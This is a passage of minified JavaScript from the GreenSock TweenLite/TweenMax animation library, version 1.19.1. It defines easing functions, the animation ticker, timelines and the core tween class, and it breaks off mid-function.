            for (r in e)"useRadians" !== r && (o = e[r], "function" == typeof o && (o = o(n, t)), c = (o + "").split("_"), s = c[0], a = parseFloat("function" != typeof t[r] ? t[r] : t[r.indexOf("set") || "function" != typeof t["get" + r.substr(3)] ? r: "get" + r.substr(3)]()), o = this.finals[r] = "string" == typeof s && "=" === s.charAt(1) ? a + parseInt(s.charAt(0) + "1", 10) * Number(s.substr(2)) : Number(s) || 0, l = o - a, c.length && (s = c.join("_"), s.indexOf("short") !== -1 && (l %= h) !== l % (h / 2) && (l = l < 0 ? l + h: l - h), s.indexOf("_cw") !== -1 && l < 0 ? l = (l + 9999999999 * h) % h - (l / h | 0) * h: s.indexOf("ccw") !== -1 && l > 0 && (l = (l - 9999999999 * h) % h - (l / h | 0) * h)), (l > 1e-6 || l < -1e-6) && (this._addTween(t, r, a, a + l, r), this._overwriteProps.push(r)));
            return ! 0
        },
        set: function(t) {
            var e;
            if (1 !== t) this._super.setRatio.call(this, t);
            else for (e = this._firstPT; e;) e.f ? e.t[e.p](this.finals[e.p]) : e.t[e.p] = this.finals[e.p],
            e = e._next
        }
    })._autoCSS = !0,
    _gsScope._gsDefine("easing.Back", ["easing.Ease"],
    function(t) {
        var e, i, n, r = _gsScope.GreenSockGlobals || _gsScope,
        s = r.com.greensock,
        a = 2 * Math.PI,
        o = Math.PI / 2,
        l = s._class,
        c = function(e, i) {
            var n = l("easing." + e,
            function() {},
            !0),
            r = n.prototype = new t;
            return r.constructor = n,
            r.getRatio = i,
            n
        },
        h = t.register ||
        function() {},
        u = function(t, e, i, n, r) {
            var s = l("easing." + t, {
                easeOut: new e,
                easeIn: new i,
                easeInOut: new n
            },
            !0);
            return h(s, t),
            s
        },
        d = function(t, e, i) {
            this.t = t,
            this.v = e,
            i && (this.next = i, i.prev = this, this.c = i.v - e, this.gap = i.t - t)
        },
        p = function(e, i) {
            var n = l("easing." + e,
            function(t) {
                this._p1 = t || 0 === t ? t: 1.70158,
                this._p2 = 1.525 * this._p1
            },
            !0),
            r = n.prototype = new t;
            return r.constructor = n,
            r.getRatio = i,
            r.config = function(t) {
                return new n(t)
            },
            n
        },
        f = u("Back", p("BackOut",
        function(t) {
            return (t -= 1) * t * ((this._p1 + 1) * t + this._p1) + 1
        }), p("BackIn",
        function(t) {
            return t * t * ((this._p1 + 1) * t - this._p1)
        }), p("BackInOut",
        function(t) {
            return (t *= 2) < 1 ? .5 * t * t * ((this._p2 + 1) * t - this._p2) : .5 * ((t -= 2) * t * ((this._p2 + 1) * t + this._p2) + 2)
        })),
        m = l("easing.SlowMo",
        function(t, e, i) {
            e = e || 0 === e ? e: .7,
            null == t ? t = .7 : t > 1 && (t = 1),
            this._p = 1 !== t ? e: 0,
            this._p1 = (1 - t) / 2,
            this._p2 = t,
            this._p3 = this._p1 + this._p2,
            this._calcEnd = i === !0
        },
        !0),
        g = m.prototype = new t;
        return g.constructor = m,
        g.getRatio = function(t) {
            var e = t + (.5 - t) * this._p;
            return t < this._p1 ? this._calcEnd ? 1 - (t = 1 - t / this._p1) * t: e - (t = 1 - t / this._p1) * t * t * t * e: t > this._p3 ? this._calcEnd ? 1 - (t = (t - this._p3) / this._p1) * t: e + (t - e) * (t = (t - this._p3) / this._p1) * t * t * t: this._calcEnd ? 1 : e
        },
        m.ease = new m(.7, .7),
        g.config = m.config = function(t, e, i) {
            return new m(t, e, i)
        },
        e = l("easing.SteppedEase",
        function(t) {
            t = t || 1,
            this._p1 = 1 / t,
            this._p2 = t + 1
        },
        !0),
        g = e.prototype = new t,
        g.constructor = e,
        g.getRatio = function(t) {
            return t < 0 ? t = 0 : t >= 1 && (t = .999999999),
            (this._p2 * t >> 0) * this._p1
        },
        g.config = e.config = function(t) {
            return new e(t)
        },
        i = l("easing.RoughEase",
        function(e) {
            e = e || {};
            for (var i, n, r, s, a, o, l = e.taper || "none",
            c = [], h = 0, u = 0 | (e.points || 20), p = u, f = e.randomize !== !1, m = e.clamp === !0, g = e.template instanceof t ? e.template: null, v = "number" == typeof e.strength ? .4 * e.strength: .4; --p > -1;) i = f ? Math.random() : 1 / u * p,
            n = g ? g.getRatio(i) : i,
            "none" === l ? r = v: "out" === l ? (s = 1 - i, r = s * s * v) : "in" === l ? r = i * i * v: i < .5 ? (s = 2 * i, r = s * s * .5 * v) : (s = 2 * (1 - i), r = s * s * .5 * v),
            f ? n += Math.random() * r - .5 * r: p % 2 ? n += .5 * r: n -= .5 * r,
            m && (n > 1 ? n = 1 : n < 0 && (n = 0)),
            c[h++] = {
                x: i,
                y: n
            };
            for (c.sort(function(t, e) {
                return t.x - e.x
            }), o = new d(1, 1, null), p = u; --p > -1;) a = c[p],
            o = new d(a.x, a.y, o);
            this._prev = new d(0, 0, 0 !== o.t ? o: o.next)
        },
        !0),
        g = i.prototype = new t,
        g.constructor = i,
        g.getRatio = function(t) {
            var e = this._prev;
            if (t > e.t) {
                for (; e.next && t >= e.t;) e = e.next;
                e = e.prev
            } else for (; e.prev && t <= e.t;) e = e.prev;
            return this._prev = e,
            e.v + (t - e.t) / e.gap * e.c
        },
        g.config = function(t) {
            return new i(t)
        },
        i.ease = new i,
        u("Bounce", c("BounceOut",
        function(t) {
            return t < 1 / 2.75 ? 7.5625 * t * t: t < 2 / 2.75 ? 7.5625 * (t -= 1.5 / 2.75) * t + .75 : t < 2.5 / 2.75 ? 7.5625 * (t -= 2.25 / 2.75) * t + .9375 : 7.5625 * (t -= 2.625 / 2.75) * t + .984375
        }), c("BounceIn",
        function(t) {
            return (t = 1 - t) < 1 / 2.75 ? 1 - 7.5625 * t * t: t < 2 / 2.75 ? 1 - (7.5625 * (t -= 1.5 / 2.75) * t + .75) : t < 2.5 / 2.75 ? 1 - (7.5625 * (t -= 2.25 / 2.75) * t + .9375) : 1 - (7.5625 * (t -= 2.625 / 2.75) * t + .984375)
        }), c("BounceInOut",
        function(t) {
            var e = t < .5;
            return t = e ? 1 - 2 * t: 2 * t - 1,
            t < 1 / 2.75 ? t *= 7.5625 * t: t = t < 2 / 2.75 ? 7.5625 * (t -= 1.5 / 2.75) * t + .75 : t < 2.5 / 2.75 ? 7.5625 * (t -= 2.25 / 2.75) * t + .9375 : 7.5625 * (t -= 2.625 / 2.75) * t + .984375,
            e ? .5 * (1 - t) : .5 * t + .5
        })),
        u("Circ", c("CircOut",
        function(t) {
            return Math.sqrt(1 - (t -= 1) * t)
        }), c("CircIn",
        function(t) {
            return - (Math.sqrt(1 - t * t) - 1)
        }), c("CircInOut",
        function(t) {
            return (t *= 2) < 1 ? -.5 * (Math.sqrt(1 - t * t) - 1) : .5 * (Math.sqrt(1 - (t -= 2) * t) + 1)
        })),
        n = function(e, i, n) {
            var r = l("easing." + e,
            function(t, e) {
                this._p1 = t >= 1 ? t: 1,
                this._p2 = (e || n) / (t < 1 ? t: 1),
                this._p3 = this._p2 / a * (Math.asin(1 / this._p1) || 0),
                this._p2 = a / this._p2
            },
            !0),
            s = r.prototype = new t;
            return s.constructor = r,
            s.getRatio = i,
            s.config = function(t, e) {
                return new r(t, e)
            },
            r
        },
        u("Elastic", n("ElasticOut",
        function(t) {
            return this._p1 * Math.pow(2, -10 * t) * Math.sin((t - this._p3) * this._p2) + 1
        },
        .3), n("ElasticIn",
        function(t) {
            return - (this._p1 * Math.pow(2, 10 * (t -= 1)) * Math.sin((t - this._p3) * this._p2))
        },
        .3), n("ElasticInOut",
        function(t) {
            return (t *= 2) < 1 ? -.5 * (this._p1 * Math.pow(2, 10 * (t -= 1)) * Math.sin((t - this._p3) * this._p2)) : this._p1 * Math.pow(2, -10 * (t -= 1)) * Math.sin((t - this._p3) * this._p2) * .5 + 1
        },
        .45)),
        u("Expo", c("ExpoOut",
        function(t) {
            return 1 - Math.pow(2, -10 * t)
        }), c("ExpoIn",
        function(t) {
            return Math.pow(2, 10 * (t - 1)) - .001
        }), c("ExpoInOut",
        function(t) {
            return (t *= 2) < 1 ? .5 * Math.pow(2, 10 * (t - 1)) : .5 * (2 - Math.pow(2, -10 * (t - 1)))
        })),
        u("Sine", c("SineOut",
        function(t) {
            return Math.sin(t * o)
        }), c("SineIn",
        function(t) {
            return 1 - Math.cos(t * o)
        }), c("SineInOut",
        function(t) {
            return - .5 * (Math.cos(Math.PI * t) - 1)
        })),
        l("easing.EaseLookup", {
            find: function(e) {
                return t.map[e]
            }
        },
        !0),
        h(r.SlowMo, "SlowMo", "ease,"),
        h(i, "RoughEase", "ease,"),
        h(e, "SteppedEase", "ease,"),
        f
    },
    !0)
}), _gsScope._gsDefine && _gsScope._gsQueue.pop()(),
function(t, e) {
    "use strict";
    var i = {},
    n = t.document,
    r = t.GreenSockGlobals = t.GreenSockGlobals || t;
    if (!r.TweenLite) {
        var s, a, o, l, c, h = function(t) {
            var e, i = t.split("."),
            n = r;
            for (e = 0; e < i.length; e++) n[i[e]] = n = n[i[e]] || {};
            return n
        },
        u = h("com.greensock"),
        d = function(t) {
            var e, i = [],
            n = t.length;
            for (e = 0; e !== n; i.push(t[e++]));
            return i
        },
        p = function() {},
        f = function() {
            var t = Object.prototype.toString,
            e = t.call([]);
            return function(i) {
                return null != i && (i instanceof Array || "object" == typeof i && !!i.push && t.call(i) === e)
            }
        } (),
        m = {},
        g = function(e, n, s, a) {
            this.sc = m[e] ? m[e].sc: [],
            m[e] = this,
            this.gsClass = null,
            this.func = s;
            var o = [];
            this.check = function(l) {
                for (var c, u, d, p, f, v = n.length,
                _ = v; --v > -1;)(c = m[n[v]] || new g(n[v], [])).gsClass ? (o[v] = c.gsClass, _--) : l && c.sc.push(this);
                if (0 === _ && s) {
                    if (u = ("com.greensock." + e).split("."), d = u.pop(), p = h(u.join("."))[d] = this.gsClass = s.apply(s, o), a) if (r[d] = i[d] = p, !(f = "undefined" != typeof module && module.exports) && "function" == typeof define && define.amd) define((t.GreenSockAMDPath ? t.GreenSockAMDPath + "/": "") + e.split(".").pop(), [],
                    function() {
                        return p
                    });
                    else if (f) if ("TweenMax" === e) {
                        module.exports = i.TweenMax = p;
                        for (v in i) p[v] = i[v]
                    } else i.TweenMax && (i.TweenMax[d] = p);
                    for (v = 0; v < this.sc.length; v++) this.sc[v].check()
                }
            },
            this.check(!0)
        },
        v = t._gsDefine = function(t, e, i, n) {
            return new g(t, e, i, n)
        },
        _ = u._class = function(t, e, i) {
            return e = e ||
            function() {},
            v(t, [],
            function() {
                return e
            },
            i),
            e
        };
        v.globals = r;
        var y = [0, 0, 1, 1],
        b = _("easing.Ease",
        function(t, e, i, n) {
            this._func = t,
            this._type = i || 0,
            this._power = n || 0,
            this._params = e ? y.concat(e) : y
        },
        !0),
        w = b.map = {},
        x = b.register = function(t, e, i, n) {
            for (var r, s, a, o, l = e.split(","), c = l.length, h = (i || "easeIn,easeOut,easeInOut").split(","); --c > -1;) for (s = l[c], r = n ? _("easing." + s, null, !0) : u.easing[s] || {},
            a = h.length; --a > -1;) o = h[a],
            w[s + "." + o] = w[o + s] = r[o] = t.getRatio ? t: t[o] || new t
        };
        for (o = b.prototype, o._calcEnd = !1, o.getRatio = function(t) {
            if (this._func) return this._params[0] = t,
            this._func.apply(null, this._params);
            var e = this._type,
            i = this._power,
            n = 1 === e ? 1 - t: 2 === e ? t: t < .5 ? 2 * t: 2 * (1 - t);
            return 1 === i ? n *= n: 2 === i ? n *= n * n: 3 === i ? n *= n * n * n: 4 === i && (n *= n * n * n * n),
            1 === e ? 1 - n: 2 === e ? n: t < .5 ? n / 2 : 1 - n / 2
        },
        s = ["Linear", "Quad", "Cubic", "Quart", "Quint,Strong"], a = s.length; --a > -1;) o = s[a] + ",Power" + a,
        x(new b(null, null, 1, a), o, "easeOut", !0),
        x(new b(null, null, 2, a), o, "easeIn" + (0 === a ? ",easeNone": "")),
        x(new b(null, null, 3, a), o, "easeInOut");
        w.linear = u.easing.Linear.easeIn,
        w.swing = u.easing.Quad.easeInOut;
        var T = _("events.EventDispatcher",
        function(t) {
            this._listeners = {},
            this._eventTarget = t || this
        });
        o = T.prototype,
        o.addEventListener = function(t, e, i, n, r) {
            r = r || 0;
            var s, a, o = this._listeners[t],
            h = 0;
            for (this !== l || c || l.wake(), null == o && (this._listeners[t] = o = []), a = o.length; --a > -1;) s = o[a],
            s.c === e && s.s === i ? o.splice(a, 1) : 0 === h && s.pr < r && (h = a + 1);
            o.splice(h, 0, {
                c: e,
                s: i,
                up: n,
                pr: r
            })
        },
        o.removeEventListener = function(t, e) {
            var i, n = this._listeners[t];
            if (n) for (i = n.length; --i > -1;) if (n[i].c === e) return void n.splice(i, 1)
        },
        o.dispatchEvent = function(t) {
            var e, i, n, r = this._listeners[t];
            if (r) for (e = r.length, e > 1 && (r = r.slice(0)), i = this._eventTarget; --e > -1;)(n = r[e]) && (n.up ? n.c.call(n.s || i, {
                type: t,
                target: i
            }) : n.c.call(n.s || i))
        };
        var k = t.requestAnimationFrame,
        S = t.cancelAnimationFrame,
        C = Date.now ||
        function() {
            return (new Date).getTime()
        },
        P = C();
        for (s = ["ms", "moz", "webkit", "o"], a = s.length; --a > -1 && !k;) k = t[s[a] + "RequestAnimationFrame"],
        S = t[s[a] + "CancelAnimationFrame"] || t[s[a] + "CancelRequestAnimationFrame"];
        _("Ticker",
        function(t, e) {
            var i, r, s, a, o, h = this,
            u = C(),
            d = !(e === !1 || !k) && "auto",
            f = 500,
            m = 33,
            g = function(t) {
                var e, n, l = C() - P;
                l > f && (u += l - m),
                P += l,
                h.time = (P - u) / 1e3,
                e = h.time - o,
                (!i || e > 0 || t === !0) && (h.frame++, o += e + (e >= a ? .004 : a - e), n = !0),
                t !== !0 && (s = r(g)),
                n && h.dispatchEvent("tick")
            };
            T.call(h),
            h.time = h.frame = 0,
            h.tick = function() {
                g(!0)
            },
            h.lagSmoothing = function(t, e) {
                f = t || 1e10,
                m = Math.min(e, f, 0)
            },
            h.sleep = function() {
                null != s && (d && S ? S(s) : clearTimeout(s), r = p, s = null, h === l && (c = !1))
            },
            h.wake = function(t) {
                null !== s ? h.sleep() : t ? u += -P + (P = C()) : h.frame > 10 && (P = C() - f + 5),
                r = 0 === i ? p: d && k ? k: function(t) {
                    return setTimeout(t, 1e3 * (o - h.time) + 1 | 0)
                },
                h === l && (c = !0),
                g(2)
            },
            h.fps = function(t) {
                if (!arguments.length) return i;
                i = t,
                a = 1 / (i || 60),
                o = this.time + a,
                h.wake()
            },
            h.useRAF = function(t) {
                if (!arguments.length) return d;
                h.sleep(),
                d = t,
                h.fps(i)
            },
            h.fps(t),
            setTimeout(function() {
                "auto" === d && h.frame < 5 && "hidden" !== n.visibilityState && h.useRAF(!1)
            },
            1500)
        }),
        o = u.Ticker.prototype = new u.events.EventDispatcher,
        o.constructor = u.Ticker;
        var R = _("core.Animation",
        function(t, e) {
            if (this.vars = e = e || {},
            this._duration = this._totalDuration = t || 0, this._delay = Number(e.delay) || 0, this._timeScale = 1, this._active = e.immediateRender === !0, this.data = e.data, this._reversed = e.reversed === !0, U) {
                c || l.wake();
                var i = this.vars.useFrames ? Y: U;
                i.add(this, i._time),
                this.vars.paused && this.paused(!0)
            }
        });
        l = R.ticker = new u.Ticker,
        o = R.prototype,
        o._dirty = o._gc = o._initted = o._paused = !1,
        o._totalTime = o._time = 0,
        o._rawPrevTime = -1,
        o._next = o._last = o._onUpdate = o._timeline = o.timeline = null,
        o._paused = !1;
        var A = function() {
            c && C() - P > 2e3 && l.wake(),
            setTimeout(A, 2e3)
        };
        A(),
        o.play = function(t, e) {
            return null != t && this.seek(t, e),
            this.reversed(!1).paused(!1)
        },
        o.pause = function(t, e) {
            return null != t && this.seek(t, e),
            this.paused(!0)
        },
        o.resume = function(t, e) {
            return null != t && this.seek(t, e),
            this.paused(!1)
        },
        o.seek = function(t, e) {
            return this.totalTime(Number(t), e !== !1)
        },
        o.restart = function(t, e) {
            return this.reversed(!1).paused(!1).totalTime(t ? -this._delay: 0, e !== !1, !0)
        },
        o.reverse = function(t, e) {
            return null != t && this.seek(t || this.totalDuration(), e),
            this.reversed(!0).paused(!1)
        },
        o.render = function(t, e, i) {},
        o.invalidate = function() {
            return this._time = this._totalTime = 0,
            this._initted = this._gc = !1,
            this._rawPrevTime = -1,
            !this._gc && this.timeline || this._enabled(!0),
            this
        },
        o.isActive = function() {
            var t, e = this._timeline,
            i = this._startTime;
            return ! e || !this._gc && !this._paused && e.isActive() && (t = e.rawTime(!0)) >= i && t < i + this.totalDuration() / this._timeScale
        },
        o._enabled = function(t, e) {
            return c || l.wake(),
            this._gc = !t,
            this._active = this.isActive(),
            e !== !0 && (t && !this.timeline ? this._timeline.add(this, this._startTime - this._delay) : !t && this.timeline && this._timeline._remove(this, !0)),
            !1
        },
        o._kill = function(t, e) {
            return this._enabled(!1, !1)
        },
        o.kill = function(t, e) {
            return this._kill(t, e),
            this
        },
        o._uncache = function(t) {
            for (var e = t ? this: this.timeline; e;) e._dirty = !0,
            e = e.timeline;
            return this
        },
        o._swapSelfInParams = function(t) {
            for (var e = t.length,
            i = t.concat(); --e > -1;)"{self}" === t[e] && (i[e] = this);
            return i
        },
        o._callback = function(t) {
            var e = this.vars,
            i = e[t],
            n = e[t + "Params"],
            r = e[t + "Scope"] || e.callbackScope || this;
            switch (n ? n.length: 0) {
            case 0:
                i.call(r);
                break;
            case 1:
                i.call(r, n[0]);
                break;
            case 2:
                i.call(r, n[0], n[1]);
                break;
            default:
                i.apply(r, n)
            }
        },
        o.eventCallback = function(t, e, i, n) {
            if ("on" === (t || "").substr(0, 2)) {
                var r = this.vars;
                if (1 === arguments.length) return r[t];
                null == e ? delete r[t] : (r[t] = e, r[t + "Params"] = f(i) && i.join("").indexOf("{self}") !== -1 ? this._swapSelfInParams(i) : i, r[t + "Scope"] = n),
                "onUpdate" === t && (this._onUpdate = e)
            }
            return this
        },
        o.delay = function(t) {
            return arguments.length ? (this._timeline.smoothChildTiming && this.startTime(this._startTime + t - this._delay), this._delay = t, this) : this._delay
        },
        o.duration = function(t) {
            return arguments.length ? (this._duration = this._totalDuration = t, this._uncache(!0), this._timeline.smoothChildTiming && this._time > 0 && this._time < this._duration && 0 !== t && this.totalTime(this._totalTime * (t / this._duration), !0), this) : (this._dirty = !1, this._duration)
        },
        o.totalDuration = function(t) {
            return this._dirty = !1,
            arguments.length ? this.duration(t) : this._totalDuration
        },
        o.time = function(t, e) {
            return arguments.length ? (this._dirty && this.totalDuration(), this.totalTime(t > this._duration ? this._duration: t, e)) : this._time
        },
        o.totalTime = function(t, e, i) {
            if (c || l.wake(), !arguments.length) return this._totalTime;
            if (this._timeline) {
                if (t < 0 && !i && (t += this.totalDuration()), this._timeline.smoothChildTiming) {
                    this._dirty && this.totalDuration();
                    var n = this._totalDuration,
                    r = this._timeline;
                    if (t > n && !i && (t = n), this._startTime = (this._paused ? this._pauseTime: r._time) - (this._reversed ? n - t: t) / this._timeScale, r._dirty || this._uncache(!1), r._timeline) for (; r._timeline;) r._timeline._time !== (r._startTime + r._totalTime) / r._timeScale && r.totalTime(r._totalTime, !0),
                    r = r._timeline
                }
                this._gc && this._enabled(!0, !1),
                this._totalTime === t && 0 !== this._duration || (F.length && G(), this.render(t, e, !1), F.length && G())
            }
            return this
        },
        o.progress = o.totalProgress = function(t, e) {
            var i = this.duration();
            return arguments.length ? this.totalTime(i * t, e) : i ? this._time / i: this.ratio
        },
        o.startTime = function(t) {
            return arguments.length ? (t !== this._startTime && (this._startTime = t, this.timeline && this.timeline._sortChildren && this.timeline.add(this, t - this._delay)), this) : this._startTime
        },
        o.endTime = function(t) {
            return this._startTime + (0 != t ? this.totalDuration() : this.duration()) / this._timeScale
        },
        o.timeScale = function(t) {
            if (!arguments.length) return this._timeScale;
            if (t = t || 1e-10, this._timeline && this._timeline.smoothChildTiming) {
                var e = this._pauseTime,
                i = e || 0 === e ? e: this._timeline.totalTime();
                this._startTime = i - (i - this._startTime) * this._timeScale / t
            }
            return this._timeScale = t,
            this._uncache(!1)
        },
        o.reversed = function(t) {
            return arguments.length ? (t != this._reversed && (this._reversed = t, this.totalTime(this._timeline && !this._timeline.smoothChildTiming ? this.totalDuration() - this._totalTime: this._totalTime, !0)), this) : this._reversed
        },
        o.paused = function(t) {
            if (!arguments.length) return this._paused;
            var e, i, n = this._timeline;
            return t != this._paused && n && (c || t || l.wake(), e = n.rawTime(), i = e - this._pauseTime, !t && n.smoothChildTiming && (this._startTime += i, this._uncache(!1)), this._pauseTime = t ? e: null, this._paused = t, this._active = this.isActive(), !t && 0 !== i && this._initted && this.duration() && (e = n.smoothChildTiming ? this._totalTime: (e - this._startTime) / this._timeScale, this.render(e, e === this._totalTime, !0))),
            this._gc && !t && this._enabled(!0, !1),
            this
        };
        var O = _("core.SimpleTimeline",
        function(t) {
            R.call(this, 0, t),
            this.autoRemoveChildren = this.smoothChildTiming = !0
        });
        o = O.prototype = new R,
        o.constructor = O,
        o.kill()._gc = !1,
        o._first = o._last = o._recent = null,
        o._sortChildren = !1,
        o.add = o.insert = function(t, e, i, n) {
            var r, s;
            if (t._startTime = Number(e || 0) + t._delay, t._paused && this !== t._timeline && (t._pauseTime = t._startTime + (this.rawTime() - t._startTime) / t._timeScale), t.timeline && t.timeline._remove(t, !0), t.timeline = t._timeline = this, t._gc && t._enabled(!0, !0), r = this._last, this._sortChildren) for (s = t._startTime; r && r._startTime > s;) r = r._prev;
            return r ? (t._next = r._next, r._next = t) : (t._next = this._first, this._first = t),
            t._next ? t._next._prev = t: this._last = t,
            t._prev = r,
            this._recent = t,
            this._timeline && this._uncache(!0),
            this
        },
        o._remove = function(t, e) {
            return t.timeline === this && (e || t._enabled(!1, !0), t._prev ? t._prev._next = t._next: this._first === t && (this._first = t._next), t._next ? t._next._prev = t._prev: this._last === t && (this._last = t._prev), t._next = t._prev = t.timeline = null, t === this._recent && (this._recent = this._last), this._timeline && this._uncache(!0)),
            this
        },
        o.render = function(t, e, i) {
            var n, r = this._first;
            for (this._totalTime = this._time = this._rawPrevTime = t; r;) n = r._next,
            (r._active || t >= r._startTime && !r._paused) && (r._reversed ? r.render((r._dirty ? r.totalDuration() : r._totalDuration) - (t - r._startTime) * r._timeScale, e, i) : r.render((t - r._startTime) * r._timeScale, e, i)),
            r = n
        },
        o.rawTime = function() {
            return c || l.wake(),
            this._totalTime
        };
        var M = _("TweenLite",
        function(e, i, n) {
            if (R.call(this, i, n), this.render = M.prototype.render, null == e) throw "Cannot tween a null target.";
            this.target = e = "string" != typeof e ? e: M.selector(e) || e;
            var r, s, a, o = e.jquery || e.length && e !== t && e[0] && (e[0] === t || e[0].nodeType && e[0].style && !e.nodeType),
            l = this.vars.overwrite;
            if (this._overwrite = l = null == l ? H[M.defaultOverwrite] : "number" == typeof l ? l >> 0 : H[l], (o || e instanceof Array || e.push && f(e)) && "number" != typeof e[0]) for (this._targets = a = d(e), this._propLookup = [], this._siblings = [], r = 0; r < a.length; r++) s = a[r],
            s ? "string" != typeof s ? s.length && s !== t && s[0] && (s[0] === t || s[0].nodeType && s[0].style && !s.nodeType) ? (a.splice(r--, 1), this._targets = a = a.concat(d(s))) : (this._siblings[r] = Z(s, this, !1), 1 === l && this._siblings[r].length > 1 && J(s, this, null, 1, this._siblings[r])) : "string" == typeof(s = a[r--] = M.selector(s)) && a.splice(r + 1, 1) : a.splice(r--, 1);
            else this._propLookup = {},
            this._siblings = Z(e, this, !1),
            1 === l && this._siblings.length > 1 && J(e, this, null, 1, this._siblings); (this.vars.immediateRender || 0 === i && 0 === this._delay && this.vars.immediateRender !== !1) && (this._time = -1e-10, this.render(Math.min(0, -this._delay)))
        },
        !0),
        E = function(e) {
            return e && e.length && e !== t && e[0] && (e[0] === t || e[0].nodeType && e[0].style && !e.nodeType)
        },
        z = function(t, e) {
            var i, n = {};
            for (i in t) X[i] || i in e && "transform" !== i && "x" !== i && "y" !== i && "width" !== i && "height" !== i && "className" !== i && "border" !== i || !(!B[i] || B[i] && B[i]._autoCSS) || (n[i] = t[i], delete t[i]);
            t.css = n
        };
        o = M.prototype = new R,
        o.constructor = M,
        o.kill()._gc = !1,
        o.ratio = 0,
        o._firstPT = o._targets = o._overwrittenProps = o._startAt = null,
        o._notifyPluginsOfEnabled = o._lazy = !1,
        M.version = "1.19.1",
        M.defaultEase = o._ease = new b(null, null, 1, 1),
        M.defaultOverwrite = "auto",
        M.ticker = l,
        M.autoSleep = 120,
        M.lagSmoothing = function(t, e) {
            l.lagSmoothing(t, e)
        },
        M.selector = t.$ || t.jQuery ||
        function(e) {
            var i = t.$ || t.jQuery;
            return i ? (M.selector = i, i(e)) : void 0 === n ? e: n.querySelectorAll ? n.querySelectorAll(e) : n.getElementById("#" === e.charAt(0) ? e.substr(1) : e)
        };
        var F = [],
        I = {},
        D = /(?:(-|-=|\+=)?\d*\.?\d*(?:e[\-+]?\d+)?)[0-9]/gi,
        L = function(t) {
            for (var e, i = this._firstPT; i;) e = i.blob ? 1 === t ? this.end: t ? this.join("") : this.start: i.c * t + i.s,
            i.m ? e = i.m(e, this._target || i.t) : e < 1e-6 && e > -1e-6 && !i.blob && (e = 0),
            i.f ? i.fp ? i.t[i.p](i.fp, e) : i.t[i.p](e) : i.t[i.p] = e,
            i = i._next
        },
        q = function(t, e, i, n) {
            var r, s, a, o, l, c, h, u = [],
            d = 0,
            p = "",
            f = 0;
            for (u.start = t, u.end = e, t = u[0] = t + "", e = u[1] = e + "", i && (i(u), t = u[0], e = u[1]), u.length = 0, r = t.match(D) || [], s = e.match(D) || [], n && (n._next = null, n.blob = 1, u._firstPT = u._applyPT = n), l = s.length, o = 0; o < l; o++) h = s[o],
            c = e.substr(d, e.indexOf(h, d) - d),
            p += c || !o ? c: ",",
            d += c.length,
            f ? f = (f + 1) % 5 : "rgba(" === c.substr( - 5) && (f = 1),
            h === r[o] || r.length <= o ? p += h: (p && (u.push(p), p = ""), a = parseFloat(r[o]), u.push(a), u._firstPT = {
                _next: u._firstPT,
                t: u,
                p: u.length - 1,
                s: a,
                c: ("=" === h.charAt(1) ? parseInt(h.charAt(0) + "1", 10) * parseFloat(h.substr(2)) : parseFloat(h) - a) || 0,
                f: 0,
                m: f && f < 4 ? Math.round: 0
            }),
            d += h.length;
            return p += e.substr(d),
            p && u.push(p),
            u.setRatio = L,
            u
        },
        N = function(t, e, i, n, r, s, a, o, l) {
            "function" == typeof n && (n = n(l || 0, t));
            var c, h = typeof t[e],
            u = "function" !== h ? "": e.indexOf("set") || "function" != typeof t["get" + e.substr(3)] ? e: "get" + e.substr(3),
            d = "get" !== i ? i: u ? a ? t[u](a) : t[u]() : t[e],
            p = "string" == typeof n && "=" === n.charAt(1),
            f = {
                t: t,
                p: e,
                s: d,
                f: "function" === h,
                pg: 0,
                n: r || e,
                m: s ? "function" == typeof s ? s: Math.round: 0,
                pr: 0,
                c: p ? parseInt(n.charAt(0) + "1", 10) * parseFloat(n.substr(2)) : parseFloat(n) - d || 0
            };
            if (("number" != typeof d || "number" != typeof n && !p) && (a || isNaN(d) || !p && isNaN(n) || "boolean" == typeof d || "boolean" == typeof n ? (f.fp = a, c = q(d, p ? f.s + f.c: n, o || M.defaultStringFilter, f), f = {
                t: c,
                p: "setRatio",
                s: 0,
                c: 1,
                f: 2,
                pg: 0,
                n: r || e,
                pr: 0,
                m: 0
            }) : (f.s = parseFloat(d), p || (f.c = parseFloat(n) - f.s || 0))), f.c) return (f._next = this._firstPT) && (f._next._prev = f),
            this._firstPT = f,
            f
        },
        $ = M._internals = {
            isArray: f,
            isSelector: E,
            lazyTweens: F,
            blobDif: q
        },
        B = M._plugins = {},
        j = $.tweenLookup = {},
        W = 0,
        X = $.reservedProps = {
            ease: 1,
            delay: 1,
            overwrite: 1,
            onComplete: 1,
            onCompleteParams: 1,
            onCompleteScope: 1,
            useFrames: 1,
            runBackwards: 1,
            startAt: 1,
            onUpdate: 1,
            onUpdateParams: 1,
            onUpdateScope: 1,
            onStart: 1,
            onStartParams: 1,
            onStartScope: 1,
            onReverseComplete: 1,
            onReverseCompleteParams: 1,
            onReverseCompleteScope: 1,
            onRepeat: 1,
            onRepeatParams: 1,
            onRepeatScope: 1,
            easeParams: 1,
            yoyo: 1,
            immediateRender: 1,
            repeat: 1,
            repeatDelay: 1,
            data: 1,
            paused: 1,
            reversed: 1,
            autoCSS: 1,
            lazy: 1,
            onOverwrite: 1,
            callbackScope: 1,
            stringFilter: 1,
            id: 1
        },
        H = {
            none: 0,
            all: 1,
            auto: 2,
            concurrent: 3,
            allOnStart: 4,
            preexisting: 5,
            true: 1,
            false: 0
        },
        Y = R._rootFramesTimeline = new O,
        U = R._rootTimeline = new O,
        V = 30,
        G = $.lazyRender = function() {
            var t, e = F.length;
            for (I = {}; --e > -1;)(t = F[e]) && t._lazy !== !1 && (t.render(t._lazy[0], t._lazy[1], !0), t._lazy = !1);
            F.length = 0
        };
        U._startTime = l.time,
        Y._startTime = l.frame,
        U._active = Y._active = !0,
        setTimeout(G, 1),
        R._updateRoot = M.render = function() {
            var t, e, i;
            if (F.length && G(), U.render((l.time - U._startTime) * U._timeScale, !1, !1), Y.render((l.frame - Y._startTime) * Y._timeScale, !1, !1), F.length && G(), l.frame >= V) {
                V = l.frame + (parseInt(M.autoSleep, 10) || 120);
                for (i in j) {
                    for (e = j[i].tweens, t = e.length; --t > -1;) e[t]._gc && e.splice(t, 1);
                    0 === e.length && delete j[i]
                }
                if ((! (i = U._first) || i._paused) && M.autoSleep && !Y._first && 1 === l._listeners.tick.length) {
                    for (; i && i._paused;) i = i._next;
                    i || l.sleep()
                }
            }
        },
        l.addEventListener("tick", R._updateRoot);
        var Z = function(t, e, i) {
            var n, r, s = t._gsTweenID;
            if (j[s || (t._gsTweenID = s = "t" + W++)] || (j[s] = {
                target: t,
                tweens: []
